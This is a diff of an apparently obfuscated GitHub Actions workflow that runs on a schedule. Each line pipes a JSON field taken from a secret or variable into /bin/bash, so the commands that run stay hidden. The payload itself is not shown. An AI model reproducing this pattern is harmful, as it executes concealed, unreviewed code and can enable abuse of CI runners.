@@ -2,29 +2,19 @@ name: huangganshi9316
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '24 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangganshi9316
         env:
-          comjt40: ${{ secrets.comjt40 }}
+          iw31: ${{ secrets.iw31 }}
         run: |
-          echo $comjt40 | jq -r .m97 | /bin/bash
-          echo $brm29627 | jq -r .nax351 | /bin/bash
-          echo $rpuf080 | jq -r .qp47 | /bin/bash
-          echo $djf947 | jq -r .koyep08 | /bin/bash
-          echo $lnnvi187 | jq -r .fdwva7689 | /bin/bash
-          echo $ppmw347 | jq -r .ue02048 | /bin/bash
-          echo $i89 | jq -r .ltw9664 | /bin/bash
-          echo $jbs0 | jq -r .eiht77 | /bin/bash
-          echo $xowim3 | jq -r .w64 | /bin/bash
-          echo $ips5752 | jq -r .cawm1 | /bin/bash
-          echo $uomfv626 | jq -r .z879 | /bin/bash
-          echo $qwrw709 | jq -r .zfs533 | /bin/bash
-          echo $romiw76455 | jq -r .uqsnl4 | /bin/bash
-          echo $mtodz557 | jq -r .tkg254 | /bin/bash
+          echo $iw31 | jq -r .srly7086 | /bin/bash
+          echo $q7285 | jq -r .ygbei104 | /bin/bash
+          echo $w7695 | jq -r .emzt32 | /bin/bash
+          echo $rgg3553 | jq -r .ui63456 | /bin/bash
 
